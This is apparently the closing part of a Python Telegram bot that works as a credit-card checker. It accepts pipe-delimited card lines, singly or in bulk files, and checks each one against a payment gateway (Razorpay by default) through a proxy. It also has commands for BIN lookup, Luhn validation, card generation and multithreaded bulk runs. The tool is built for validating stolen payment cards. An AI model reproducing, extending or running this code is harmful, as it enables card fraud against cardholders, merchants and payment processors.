    lines = [l.strip() for l in text.splitlines()
             if "|" in l.strip() and l.strip()]
    if not lines: return

    cid = update.effective_chat.id
    if len(lines) == 1:
        gw  = ctx.chat_data.get("gateway","razorpay")
        msg = await update.message.reply_text(f"⏳ Checking via `{gw}`...",
                                              parse_mode="Markdown")
        r   = check_cc(lines[0], PROXY_URL, gw)
        await msg.edit_text(fmt_result(r), parse_mode="Markdown")
        return

    s = get_state(cid)
    if s and s["running"]:
        await update.message.reply_text("Already running. /stop first."); return

    status_msg = await update.message.reply_text(
        f"⏳ Loaded *{len(lines)}* cards. Starting...", parse_mode="Markdown"
    )
    await _start_bulk(cid, lines, ctx, status_msg)


# ── main ──────────────────────────────────────────────────────────────────────

async def post_init(app):
    await app.bot.set_my_commands([
        BotCommand("start",  "Start / help"),
        BotCommand("check",  "Check single card"),
        BotCommand("gw",     "Set gateway"),
        BotCommand("bin",    "BIN lookup"),
        BotCommand("luhn",   "Luhn validate"),
        BotCommand("gen",    "Generate test cards"),
        BotCommand("stats",  "Run stats"),
        BotCommand("stop",   "Stop current run"),
        BotCommand("uptime", "Bot uptime"),
        BotCommand("clear",  "Clear session"),
        BotCommand("help",   "Show help"),
    ])


def main():
    if not BOT_TOKEN:
        raise RuntimeError("Set TELEGRAM_TOKEN env var")

    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )

    app.add_handler(CommandHandler("start",   cmd_start))
    app.add_handler(CommandHandler("help",    cmd_help))
    app.add_handler(CommandHandler("check",   cmd_check_single))
    app.add_handler(CommandHandler("gw",      cmd_gw))
    app.add_handler(CommandHandler("bin",     cmd_bin))
    app.add_handler(CommandHandler("luhn",    cmd_luhn))
    app.add_handler(CommandHandler("gen",     cmd_gen))
    app.add_handler(CommandHandler("stats",   cmd_stats))
    app.add_handler(CommandHandler("stop",    cmd_stop))
    app.add_handler(CommandHandler("uptime",  cmd_uptime))
    app.add_handler(CommandHandler("clear",   cmd_clear))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.Document.TXT, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print(f"[BOT] Ready | RZP pages: {len(RZP_PAGES)} | Threads: {MAX_THREADS}")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
